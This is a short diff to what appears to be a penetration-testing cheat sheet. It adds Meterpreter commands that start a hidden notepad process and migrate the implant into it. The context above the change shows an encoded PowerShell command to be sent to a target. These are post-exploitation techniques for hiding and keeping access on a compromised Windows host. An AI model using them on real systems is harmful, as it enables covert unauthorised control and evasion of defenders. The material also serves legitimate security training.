@@ -96,3 +96,10 @@ Send this to the target:
 powershell -enc <string>
 ```
 
+Create a hidden notepad process and migrate to it
+
+```bash
+meterpreter > execute -H -f notepad
+meterpreter > migrate 620 
+```
+
